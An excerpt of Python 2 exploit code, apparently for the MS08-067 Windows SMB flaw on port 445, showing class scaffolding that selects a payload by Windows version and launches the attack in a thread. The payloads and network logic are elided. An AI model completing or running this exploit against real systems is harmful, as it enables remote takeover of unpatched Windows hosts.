...
class MS08Exploit(Thread):
    def __init__(self, target, osver, port=445):
        super(MS08Exploit, self).__init__()
        self.__port = port
        self.target = target
        self.osver = osver
        if osver == '1':  # Windows 2000 Payload
            self.payload = payload_1
            print '[-]Windows 2000 payload loaded'
        if osver == '2':  # Windows 2003[SP2] Payload
            self.payload = payload_2
...
class MS08(object):
    ...
    def __init__(self, target, version, port=445):
        self.__port = port
        self.target = target
        self.version = version

    def launch(self):
        MS08Exploit(self.target, self.version).start()
